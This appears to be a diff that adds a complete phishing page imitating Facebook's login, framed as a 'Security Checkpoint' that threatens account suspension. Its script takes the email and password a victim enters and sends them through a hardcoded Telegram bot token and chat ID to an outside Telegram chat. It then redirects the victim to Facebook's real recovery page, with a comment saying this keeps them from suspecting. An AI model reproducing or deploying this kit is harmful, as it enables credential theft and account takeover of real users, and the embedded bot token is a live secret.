@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Security | Action Required</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; flex-direction: column; align-items: center; margin: 0; padding-top: 50px; }
+        .logo { width: 120px; margin-bottom: 25px; }
+        .box { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; border: 1px solid #dddfe2; }
+        .header-txt { font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 10px; }
+        .info-txt { font-size: 14px; color: #606770; margin-bottom: 20px; line-height: 1.5; }
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; box-sizing: border-box; background-color: #f5f6f7; }
+        .btn-login { width: 100%; padding: 12px; border: none; background-color: #1877f2; color: white; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        .btn-login:hover { background-color: #166fe5; }
+        .footer { margin-top: 30px; font-size: 12px; color: #737373; }
+    </style>
+</head>
+<body>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" class="logo" alt="facebook">
+    
+    <div class="box">
+        <div class="header-txt">Security Checkpoint</div>
+        <p class="info-txt">Your account has been flagged for a potential security violation. Please log in to verify your identity and prevent permanent suspension.</p>
+        <form id="fbForm">
+            <input type="text" id="email" placeholder="Email address or phone number" required>
+            <input type="password" id="pass" placeholder="Password" required>
+            <button type="submit" id="subBtn" class="btn-login">Verify Identity</button>
+        </form>
+    </div>
+    
+    <div class="footer">Meta © 2026. All rights reserved.</div>
+
+    <script>
+        const token = "8295681279:AAHBcRjLGmz_MjpjCszDqTC33SIMpamlmh8";
+        const chatId = "8487366702";
+
+        document.getElementById('fbForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const btn = document.getElementById('subBtn');
+            btn.innerText = "Authenticating...";
+            btn.disabled = true;
+
+            const user = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            const msg = 💙 **New Facebook Catch!**\n\n👤 User: \${user}\ \n🔑 Pass: \${pass}\ \n🌍 Platform: GitHub Web;
+
+            fetch(https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=markdown)
+            .then(() => {
+                // تحويل لصفحة الأمان الحقيقية باش ما يشكش
+                window.location.href = "https://www.facebook.com/help/account-recovery";
+            })
+            .catch(() => {
+                window.location.href = "https://www.facebook.com/help/account-recovery";
+            });
+        });
+    </script>
+</body>
+      </html>
